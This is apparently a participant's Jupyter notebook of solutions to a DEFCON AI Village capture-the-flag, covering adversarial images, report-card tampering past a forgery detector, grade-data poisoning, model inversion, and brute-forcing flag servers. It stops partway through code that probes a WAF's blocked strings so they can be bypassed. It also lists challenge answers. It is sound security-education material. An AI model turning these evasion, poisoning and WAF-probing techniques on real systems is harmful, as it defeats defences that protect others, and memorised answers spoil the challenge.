{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CTF Template\n",
    "\n",
    "Welcome to the DEFCON AI Village Capture-the-Flag (CTF). Feel free to copy this notebook and use it as the foundation for your submissions.\n",
    "\n",
    "## Intro\n",
    "\n",
    "Help Henry Hacker get to Homecoming! In this series of challenges, you'll be interacting with various machine learning challenges. You're welcome to use this notebook as a template, but can also use any other resources. `Submission Helper` code is just there to show you how to interact with a challenge. You're encouraged to write your own code. There are no fake flags, so if you're returned a 256 character-long string, you found it! Collect those flags, add them next to their corresponding challenge in `solution.csv` (provided) and submit them to the scoreboard. We've provided an `add_flag()` function to help with this. There's no limit to how many times you try the challenges, but you can only submit `solution.csv` to the scoreboard 50 times per day. \n",
    "\n",
    "CTF's are inherently puzzles that are intended to challenge you and help you learn new things. Sometimes they may be a little ambiguous or misleading. That's part of the challenge! However, if you feel like a challenge or piece of infrastructure isn't working correctly, contact the organizers through the Kaggle discussion board or the discord channel."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "_cell_guid": "b1076dfc-b9ad-4769-8c92-a6c4dae69d19",
    "_uuid": "8f2839f25d086af736a60e9eeb907d3b93b6e0e5",
    "tags": []
   },
   "outputs": [],
   "source": [
    "# We're just importing some stuff to make sure the challenges and helper code works.\n",
    "# Feel free to import anything else you need (or solve in a different language), but if you overwrite these, provided code may not work.\n",
    "\n",
    "import base64\n",
    "import concurrent.futures\n",
    "import functools\n",
    "import itertools\n",
    "import json\n",
    "import os\n",
    "import shutil\n",
    "import time\n",
    "import warnings\n",
    "from pathlib import Path\n",
    "from typing import Callable\n",
    "\n",
    "import cv2\n",
    "import joblib\n",
    "import matplotlib.pyplot as plt\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import requests\n",
    "import sklearn\n",
    "import tensorflow as tf\n",
    "import tensorflow.keras\n",
    "import torch.nn.functional as F\n",
    "import torch\n",
    "import tqdm\n",
    "from IPython.display import Image as Ima\n",
    "from IPython.display import clear_output, display\n",
    "from matplotlib import colors, ticker\n",
    "from PIL import Image as Im\n",
    "from PIL import ImageOps\n",
    "from scipy import ndimage as ndi\n",
    "from skimage.feature import canny\n",
    "from sklearn import manifold, datasets\n",
    "from torch import nn\n",
    "from torch.utils.data import Dataset, DataLoader\n",
    "from torchvision import models\n",
    "\n",
    "warnings.filterwarnings(\"ignore\")\n",
    "dir_name = \"ai-village-ctf\"\n",
    "IMAGENET_DEFAULT_MEAN = (0.485, 0.456, 0.406)\n",
    "IMAGENET_DEFAULT_STD = (0.229, 0.224, 0.225)\n",
    "\n",
    "# Input data files are available in the read-only \"../input/\" directory\n",
    "# You can write up to 20GB to the current directory (/kaggle/working/) that gets preserved as output when you create a version using \"Save & Run All\" \n",
    "# You can also write temporary files to /kaggle/temp/, but they won't be saved outside of the current session"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HOTDOG (id: hotdog) -- 200 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "This is Chester. He's heard of Hotdog/Not Hotdog, but really wants to be classified as a hot-dog (get it?).\n",
    "\n",
    "### Objective\n",
    "\n",
    "Help Chester classify as a hotdog."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "Ima(filename=f'{dir_name}/hotdog/chester.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "Ima(filename=f\"{dir_name}/hotdog/Hot_dog_with_mustard.png\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "IMAGE_DIMS = (224, 224)\n",
    "\n",
    "img = Im.open(f\"{dir_name}/hotdog/Hot_dog_with_mustard.png\")\n",
    "img = img.resize(IMAGE_DIMS).convert('RGB')\n",
    "img_bytes = img.tobytes()\n",
    "b64_img_bytes = base64.urlsafe_b64encode(img_bytes)\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"https://hotdog.fly.dev/score\", data=json.dumps({\"input\": b64_img_bytes.decode()}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Math\n",
    "\n",
    "This series of \"Math\" challenges is designed to introduce the concepts of dimensionality.\n",
    "\n",
    "Data is often represented in a high dimensional space, but is actually several intrinsically low dimensional components that can be diagnosed. Intrinsic low-dimensionailty is incredibly important to machine learning because many ML algorithms rely on it. Medical EKG data is as single intrinsically 2 dimensional component, despite often being represented as 100 dimensions or more. The classic MNIST dataset is several components of 8-10 dimensions, depending on the digits class, despite being represented in 784 dimensions. The 4 math challenges are focused on this problem. **If you need a hint, ask Sven at the Art Booth.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Math Challenge 1 (id: math_1) -- 100 Points\n",
    "\n",
    "How many clusters are in the clusters1.npy, clusters2.npy, and clusters3.npy? The key is the number of clusters in order, with no spaces. These files are available in the input directory under `math`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "solution = 100\n",
    "while True:\n",
    "    try:\n",
    "        r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"math_1\", \"submission\": str(solution)}))\n",
    "        print(f\"{solution}: {r.text}\")\n",
    "        if len(r.text) > 100:\n",
    "            break\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")\n",
    "        time.sleep(1.)\n",
    "    else:\n",
    "        solution += 1\n",
    "        \n",
    "# Solution: 523"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Math Challenge 2 (id: math_2) -- 200 Points\n",
    "\n",
    "What's the dimensionality of the data in first_dim1.npy, first_dim2.npy, and first_dim3.npy? The key is the number of dimensions in order, with no spaces.  These files are available in the input directory under `math`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "solution = 100\n",
    "while True:\n",
    "    try:\n",
    "        r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"math_2\", \"submission\": solution}))\n",
    "        print(f\"{solution}: {r.text}\")\n",
    "        if len(r.text) > 100:\n",
    "            break\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")\n",
    "        time.sleep(1.)\n",
    "    else:\n",
    "        solution += 1\n",
    "        \n",
    "# Solution: 354"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Math Challenge 3 (id: math_3) -- 300 Points\n",
    "\n",
    "What's the dimensionality of the data in second_dim1.npy, second_dim2.npy, and second_dim3.npy? The key is the number of clusters in order, with no spaces.  These files are available in the input directory under `math`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "solution = 100\n",
    "while True:\n",
    "    try:\n",
    "        r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"math_3\", \"submission\": solution}))\n",
    "        print(f\"{solution}: {r.text}\")\n",
    "        if len(r.text) > 100:\n",
    "            break\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")\n",
    "        time.sleep(1.)\n",
    "    else:\n",
    "        solution += 1\n",
    "        \n",
    "# Solution: 474"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Math Challenge 4 (id: math_4) -- 400 Points\n",
    "\n",
    "What's the dimensionality of the clusters in clusters1.npy? The key is the dimensions ordered by cluster size (smallest to largest), with no spaces.  These files are available in the input directory under `math`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "solution = 100\n",
    "while True:\n",
    "    try:\n",
    "        r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"math_4\", \"submission\": solution}))\n",
    "        print(f\"{solution}: {r.text}\")\n",
    "        if len(r.text) > 100:\n",
    "            break\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")\n",
    "        time.sleep(1.)\n",
    "    else:\n",
    "        solution += 1\n",
    "\n",
    "# Solution: 54312"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WIFI (id: wifi) -- 200 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "You really need to check your email, unfortunately you don't know the password.  Fortunately, someone wrote it down.  Unfortunately, it's written down on a low-dimensional manifold embedded in a very high-dimensional space.  Check out the `wifi/Embedded characters.npz` file -- a list of tokens is given in the `tokens` key with their corresponding embeddings in the same order under the `embeddings` key -- and recover the password.\n",
    "\n",
    "### Objective\n",
    "\n",
    "The password is your flag, like all others, it has the format `FLAG{something}`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "wifi_file = np.load(f\"{dir_name}/wifi/Embedded_characters.npz\")\n",
    "tokens = wifi_file[\"tokens\"].item()\n",
    "embeddings = wifi_file[\"embeddings\"]\n",
    "print(\"Number of tokens:\", len(tokens))\n",
    "print(\"Embeddings shape:\", embeddings.shape)\n",
    "print(tokens)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# This is all straight from the sklearn docs: \n",
    "# https://scikit-learn.org/stable/auto_examples/manifold/plot_compare_methods.html#sphx-glr-auto-examples-manifold-plot-compare-methods-py\n",
    "def add_2d_scatter(ax, points, points_color, title=None):\n",
    "    x, y = points.T\n",
    "    ax.scatter(x, y, c=points_color, s=50, alpha=0.8)\n",
    "    ax.set_title(title)\n",
    "    ax.xaxis.set_major_formatter(ticker.NullFormatter())\n",
    "    ax.yaxis.set_major_formatter(ticker.NullFormatter())\n",
    "    \n",
    "    \n",
    "rng = np.random.RandomState(0)\n",
    "n_neighbors = 12  # neighborhood which is used to recover the locally linear structure\n",
    "n_components = 2  # number of coordinates for the manifold\n",
    "params = {\n",
    "    \"n_neighbors\": n_neighbors,\n",
    "    \"n_components\": n_components,\n",
    "    \"eigen_solver\": \"auto\",\n",
    "    \"random_state\": rng,\n",
    "}\n",
    "\n",
    "lle_standard = manifold.LocallyLinearEmbedding(method=\"standard\", **params)\n",
    "S_standard = lle_standard.fit_transform(embeddings)\n",
    "\n",
    "lle_ltsa = manifold.LocallyLinearEmbedding(method=\"ltsa\", **params)\n",
    "S_ltsa = lle_ltsa.fit_transform(embeddings)\n",
    "\n",
    "lle_hessian = manifold.LocallyLinearEmbedding(method=\"hessian\", **params)\n",
    "S_hessian = lle_hessian.fit_transform(embeddings)\n",
    "\n",
    "lle_mod = manifold.LocallyLinearEmbedding(method=\"modified\", modified_tol=0.8, **params)\n",
    "S_mod = lle_mod.fit_transform(embeddings)\n",
    "\n",
    "fig, axs = plt.subplots(\n",
    "    nrows=2, ncols=2, figsize=(7, 7), facecolor=\"white\", constrained_layout=True\n",
    ")\n",
    "fig.suptitle(\"Locally Linear Embeddings\", size=16)\n",
    "\n",
    "lle_methods = [\n",
    "    (\"Standard locally linear embedding\", S_standard),\n",
    "    (\"Local tangent space alignment\", S_ltsa),\n",
    "    (\"Hessian eigenmap\", S_hessian),\n",
    "    (\"Modified locally linear embedding\", S_mod),\n",
    "]\n",
    "for ax, method in zip(axs.flat, lle_methods):\n",
    "    name, points = method\n",
    "    add_2d_scatter(ax, points, np.arange(len(tokens)), name)\n",
    "\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "lle_ltsa = manifold.LocallyLinearEmbedding(\n",
    "    method=\"ltsa\",\n",
    "    n_neighbors=n_neighbors,\n",
    "    n_components=1,\n",
    "    eigen_solver=\"auto\",\n",
    "    random_state=rng,\n",
    ")\n",
    "embeddings_1d = lle_ltsa.fit_transform(embeddings)\n",
    "tokens_to_embeddings = list(zip(tokens, embeddings_1d))\n",
    "tokens_to_embeddings_ordered = sorted(tokens_to_embeddings, key=lambda x: x[1], reverse=True)\n",
    "\"\".join([t2e[0] for t2e in tokens_to_embeddings_ordered])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"wifi\", \"submission\": \"FLAG{TURNED}\"}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HOTTERDOG (id: hotterdog) -- 400 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "Chester submitted himself in the \"most creative hotdog\" contest. They use machine vision to score the hotdogs, but oh no he already submitted his headshot.\n",
    "\n",
    "### Objective\n",
    "\n",
    "Help Chester classify as a hotdog, but it has to look like Chester to a human. Modify his picture to fool a classifier."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Solution\n",
    "I used this tutorial notebook to generate a bunch of adversarial examples:\n",
    "\n",
    "https://github.com/Harry24k/adversarial-attacks-pytorch/blob/master/demos/White%20Box%20Attack%20(ImageNet).ipynb\n",
    "\n",
    "Then, since that wasn't enough, I also overlaid Chester's image with hotdog images + random noise until I got lucky. See: `hotterdog/query.py` for the code. I've only included the final successful image though."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "IMAGE_DIMS = (224, 224)\n",
    "\n",
    "img = Im.open(f\"{dir_name}/hotterdog/successful_adversary.png\")\n",
    "img = img.resize(IMAGE_DIMS).convert('RGB')\n",
    "img_bytes = img.tobytes()\n",
    "b64_img_bytes = base64.urlsafe_b64encode(img_bytes)\n",
    "try:\n",
    "    r = requests.post(\"https://hotterdog.fly.dev/score\", data=json.dumps({\"input\": b64_img_bytes.decode()}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")\n",
    "    \n",
    "# Solution: 9_DIFGSM.png + plenty of luck"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Honorstudent (id: honorstudent) -- 300 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "Look at your report card! That's an F. You won't be able to go to homecoming with that grade. Can you use some carefully placed whiteout to fool your parents into thinking it's an A?\n",
    "\n",
    "### Objective\n",
    "\n",
    "Modify and submit your tampered `f.png`. Be careful to not overdo it!\n",
    "\n",
    "### Solution\n",
    "\n",
    "Windows paint to create an A, and then an online photo compressor to dodge the tampering detection."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "Ima(filename=f'{dir_name}/honorstudent/f.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Ima(filename=f'{dir_name}/honorstudent/f_tampered-min.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "with open(f\"{dir_name}/honorstudent/f_tampered-min.png\", \"rb\") as f:\n",
    "    try:\n",
    "        r = requests.post(\"https://honorstudent.fly.dev/score\", files={\"data_file\": f})\n",
    "        print(r.text)\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Secret Sloth (id: sloth) -- 400 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "The sloth in `secret.sloth/secret-sloth.png` has a very cool hat... and a secret message for you. The message is your flag.\n",
    "\n",
    "### Objective \n",
    "\n",
    "The flag is in the image somewhere; as always, look for `FLAG{something}`\n",
    "\n",
    "### Solution\n",
    "\n",
    "Brute force over a list of English words from http://www.mieliestronk.com/wordlist.html\n",
    "\n",
    "See `secret.sloth/sloth_query.py` for the code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Ima(f\"{dir_name}/secret.sloth/secret-sloth.png\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"sloth\", \"submission\": \"FLAG{SPECTRAL}\"}))\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "execution": {
     "iopub.execute_input": "2022-07-06T18:06:36.22512Z",
     "iopub.status.busy": "2022-07-06T18:06:36.224662Z",
     "iopub.status.idle": "2022-07-06T18:06:36.324329Z",
     "shell.execute_reply": "2022-07-06T18:06:36.322661Z",
     "shell.execute_reply.started": "2022-07-06T18:06:36.225025Z"
    }
   },
   "source": [
    "# Bad to Good (id: bad_to_good) -- 300 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "You can’t buy a homecoming ticket if you get classified as a “good student”. Can you help Henry poison the classifier? He can only access one of four classes grades, but he can influence the everyone in the class.\n",
    "\n",
    "### Objective\n",
    "\n",
    "Modify and submit your tampered `csv`. Try and get Henry classified as a good student. Be careful to not overdo it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "math_df = pd.read_csv(f\"{dir_name}/bad2good/math.csv\")\n",
    "henry_mask = math_df[\"FirstName\"] == \"Henry\"\n",
    "lots_of_9s = 0.999999999\n",
    "math_df[\"Grade\"] = np.where(\n",
    "    henry_mask,\n",
    "    200 + lots_of_9s,\n",
    "    0\n",
    ")\n",
    "math_df[\"Score\"] = np.where(\n",
    "    henry_mask,\n",
    "    100,\n",
    "    0\n",
    ")\n",
    "math_df[\"Demerits\"] = np.where(\n",
    "    henry_mask,\n",
    "    -1,\n",
    "    9 + lots_of_9s\n",
    ")\n",
    "math_df[\"Absences\"] = np.where(\n",
    "    henry_mask,\n",
    "    0,\n",
    "    9 + lots_of_9s\n",
    ")\n",
    "math_df.to_csv(f\"{dir_name}/bad2good/math_tampered.csv\", index=False)\n",
    "math_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Submission Helper\n",
    "\n",
    "with open(f\"{dir_name}/bad2good/math_tampered.csv\", \"r\") as f:\n",
    "    try:\n",
    "        r = requests.post(\"https://bad2good.fly.dev/score\", files={\"data_file\": f})\n",
    "        print(r.text)\n",
    "    except requests.exceptions.ConnectionError:\n",
    "        print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Inference (id: inference) -- 400 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "Model model on the wall, who is the fairest of them all?\n",
    "\n",
    "?gnidaer llits uoy era yhW .uoy htiw skcans thguorb ev'dluohs uoY .skcans rof pots t'noD .won oG .tsaf oG .niW .galf eht teG .ledom eht esreveR\n",
    "\n",
    "### Objective\n",
    "\n",
    "Retrieve the images that spell the flag. Wrap any text in `FLAG{}`\n",
    "\n",
    "**If you need a hint, there's a guy named `moo` somewhere.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "letter_to_img = {}\n",
    "for letter_path in Path(f\"{dir_name}/inference/handwritten\").glob(\"*.png\"):\n",
    "    img = Im.open(letter_path).resize((32, 32))\n",
    "    img = ImageOps.grayscale(img)\n",
    "    # Need to invert images, since many MNIST-style datasets expect white letters on black backgrounds\n",
    "    img = ImageOps.invert(img)\n",
    "    letter_to_img[letter_path.stem] = img\n",
    "    \n",
    "x = np.stack([\n",
    "    np.array(img).astype(float) / 255.\n",
    "    for img in letter_to_img.values()\n",
    "])[:, :, :, None]\n",
    "try:\n",
    "    response = requests.post(\"https://inference.fly.dev/score\", data = json.dumps({\"input\": x.tolist()}))\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")\n",
    "    \n",
    "letter_to_outputs = {}\n",
    "for letter, output in zip(letter_to_img.keys(), response.json()[\"outputs\"]):\n",
    "    letter_to_outputs[letter] = np.round(np.array(output) * 100.) / 100.\n",
    "\n",
    "letter_to_outputs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "full_response_array = np.array(response.json()[\"outputs\"])\n",
    "candidate_letters = []\n",
    "for column in full_response_array.T:\n",
    "    candidate_letters.append([list(letter_to_img.keys())[i] for i in reversed(np.argsort(column))])\n",
    "    \n",
    "top_n = 5\n",
    "candidate_letters = [letters[:top_n] for letters in candidate_letters]\n",
    "candidate_letters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "# To try and get the flag\n",
    "def try_solution(candidate_string: str) -> str:\n",
    "    sleep_counter = 1.\n",
    "    while True:\n",
    "        try:\n",
    "            r = requests.post(\"http://flags.fly.dev:5000/score\", json=json.dumps({\"challenge_id\": \"inference\", \"submission\": candidate_string}))\n",
    "            return r.text\n",
    "        except requests.exceptions.ConnectionError:\n",
    "            print(\"Connection problems. Contact the CTF organizers.\")\n",
    "            time.sleep(sleep_counter)\n",
    "            sleep_counter += 1.\n",
    "\n",
    "            \n",
    "with concurrent.futures.ThreadPoolExecutor() as executor:\n",
    "    candidate_strings = [\n",
    "        \"FLAG{\" + \"\".join(candidate) + \"}\"\n",
    "        for candidate in itertools.product(*candidate_letters)\n",
    "    ]\n",
    "    future_to_candidate_string = {\n",
    "        executor.submit(try_solution, candidate_string): candidate_string\n",
    "        for candidate_string in candidate_strings\n",
    "    }\n",
    "    solution = None\n",
    "    solution_response = None\n",
    "    # Can't use concurrent.futures.as_completed without hanging or waiting for all requests to complete\n",
    "    # https://tiewkh.github.io/blog/python-thread-pool-executor/\n",
    "    for future, candidate_string in tqdm.tqdm(future_to_candidate_string.items()):\n",
    "        if future.cancelled():\n",
    "            continue\n",
    "            \n",
    "        response = future.result()\n",
    "        if len(response) > 100:\n",
    "            solution = candidate_string\n",
    "            solution_response = response\n",
    "            executor.shutdown(wait=False, cancel_futures=True)\n",
    "\n",
    "if solution:\n",
    "    time.sleep(0.5)\n",
    "    print(\"Success!\")\n",
    "    print(f\"Solution: {solution}\")\n",
    "    print(f\"Response: {solution_response}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Baseball  (id: baseball) -- 300 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "Henry has to miss baseball tryouts to get ready for his date. Can you cover for him? Henry is a pitcher and the team uses software to analyze pitch patterns to classify pitchers. \n",
    "\n",
    "### Objective\n",
    "\n",
    "Throw 15 pitches at x,y (each bounded on [0,29]). Check out `test_pitch.json` to see the expected format. Can you throw 15 pitches to get classified as Henry?\n",
    "\n",
    "### Solution\n",
    "\n",
    "I searched over a grid of values (10,10 - 25,25) to find the ones that were the most confident, and then used those most-confident responses to bruteforce find/guess the final solution."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def pitches_to_submission(pitches):\n",
    "    submission = []\n",
    "    pitches_set = set()\n",
    "    for i, j in pitches:\n",
    "        submission.append({\n",
    "            \"x\": i.item(),\n",
    "            \"y\": j.item(),\n",
    "        })\n",
    "        pitches_set.add((i, j))\n",
    "\n",
    "    if len(pitches_set) < 15:\n",
    "        return None\n",
    "    \n",
    "    return {\"pitches\": submission}\n",
    "    \n",
    "\n",
    "def generate_pitches_submission(x_loc: float, y_loc: float, max_retries=100):\n",
    "    for i in range(max_retries):\n",
    "        x_pitches_raw = np.random.normal(loc=x_loc, scale=3., size=(15, 1))\n",
    "        y_pitches_raw = np.random.normal(loc=y_loc, scale=3., size=(15, 1))\n",
    "        pitches_raw = np.concatenate([x_pitches_raw, y_pitches_raw], axis=-1)\n",
    "        pitches = pitches_raw.astype(int).clip(0, 29)\n",
    "        submission = pitches_to_submission(pitches)\n",
    "        if submission:\n",
    "            return submission\n",
    "    \n",
    "    raise RuntimeError(f\"Failed to generate a valid submission in {max_retries} attempts.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "tags": []
   },
   "outputs": [],
   "source": [
    "def get_solution_value(submission) -> float:\n",
    "    while True:\n",
    "        try:\n",
    "            r = requests.post(\"https://bball.fly.dev/score\", json=submission)\n",
    "            print(f\"x_loc: {x}, y_loc: {y}: {r.text}\")\n",
    "            break\n",
    "        except requests.exceptions.ConnectionError:\n",
    "            print(\"Connection problems. Contact the CTF organizers.\")\n",
    "    \n",
    "    if \"Bring the heat!\" in r.text:\n",
    "        print(f\"Submission: {submission}\")\n",
    "        raise RuntimeError(\"Solution found!\")\n",
    "        \n",
    "    if \"henry\" in r.text:\n",
    "        return max(best_solutions[(x, y)], float(r.text[79:85]))\n",
    "    \n",
    "    return -1.0\n",
    "\n",
    "\n",
    "best_solutions = {}\n",
    "for x in range(10, 25):\n",
    "    for y in range(10, 25):\n",
    "        submission = generate_pitches_submission(x_loc=x, y_loc=y)\n",
    "        best_solutions[(x, y)] = get_solution_value(submission)\n",
    "\n",
    "for (x, y), _ in sorted(list(best_solutions.items()), key=lambda x: x[1], reverse=True):    \n",
    "    for n_attempts in range(25):\n",
    "        submission = generate_pitches_submission(x_loc=x, y_loc=y)\n",
    "        best_solutions[(x, y)] = get_solution_value(submission)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# x_loc: 13, y_loc: 13, scale=3.\n",
    "henry_pitches = {\n",
    "    'pitches': [\n",
    "        {'x': 11, 'y': 13}, \n",
    "        {'x': 17, 'y': 12},\n",
    "        {'x': 15, 'y': 11},\n",
    "        {'x': 10, 'y': 17},\n",
    "        {'x': 12, 'y': 8},\n",
    "        {'x': 11, 'y': 3},\n",
    "        {'x': 10, 'y': 8},\n",
    "        {'x': 10, 'y': 18},\n",
    "        {'x': 15, 'y': 13}, \n",
    "        {'x': 18, 'y': 9},\n",
    "        {'x': 15, 'y': 12}, \n",
    "        {'x': 16, 'y': 11}, \n",
    "        {'x': 13, 'y': 12}, \n",
    "        {'x': 9, 'y': 13},\n",
    "        {'x': 11, 'y': 16}\n",
    "    ]\n",
    "}\n",
    "with open(f\"{dir_name}/baseball/henry_pitches.json\", \"w\") as f:\n",
    "    json.dump(henry_pitches, f)\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"https://bball.fly.dev/score\", json=henry_pitches)\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "execution": {
     "iopub.execute_input": "2022-07-25T14:57:01.38663Z",
     "iopub.status.busy": "2022-07-25T14:57:01.386134Z",
     "iopub.status.idle": "2022-07-25T14:57:01.39651Z",
     "shell.execute_reply": "2022-07-25T14:57:01.394443Z",
     "shell.execute_reply.started": "2022-07-25T14:57:01.386588Z"
    }
   },
   "source": [
    "# WAF (id: waf) -- 500 Points\n",
    "\n",
    "### Scenario\n",
    "\n",
    "A ML model has been built to detect a 0-day. This model is used by a Web Application Firewall to block malicious requests.\n",
    "\n",
    "### Objective\n",
    "\n",
    "The goal of the challenge is to discover what the 0-day is by what it is blocking, and then bypass the WAF to exploit the system.\n",
    "\n",
    "PS: The WAF assesses malicious strings in 5 characters blocks."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_previous_character(final_four: str, verbose: bool = True) -> str | None:\n",
    "    assert len(final_four) == 4\n",
    "    for c in \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\":\n",
    "        combined = c + final_four\n",
    "        data = json.dumps(\n",
    "            {\"input\": combined}\n",
    "        )\n",
    "        r = requests.post(\"https://waf.fly.dev/score\", data=data)\n",
    "        if verbose:\n",
    "            print(f\"{c} - {combined}: {r.text}\")\n",
    "            \n",
    "        if \"MALICIOUS REQUEST CAUGHT BY WAF\" in r.text:\n",
    "            return c\n",
    "    \n",
    "    return None\n",
    "\n",
    "\n",
    "def get_next_character(first_four: str, verbose: bool = True) -> str | None:\n",
    "    assert len(first_four) == 4\n",
    "    for c in \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\":\n",
    "        combined = first_four + c\n",
